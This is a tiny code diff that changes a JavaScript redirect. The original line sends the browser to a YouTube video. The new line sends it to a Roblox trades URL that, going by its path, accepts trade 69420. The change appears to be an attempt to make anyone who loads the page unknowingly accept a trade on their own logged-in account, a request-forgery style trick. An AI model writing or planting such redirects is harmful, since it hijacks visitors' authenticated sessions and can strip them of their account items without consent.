@@ -1,2 +1,2 @@
-location.replace('https://www.youtube.com/watch?v=iQKzuAhzoi0&t=50s')
+location.replace('https://trades.roblox.com/v1/trades/69420/accept')
 
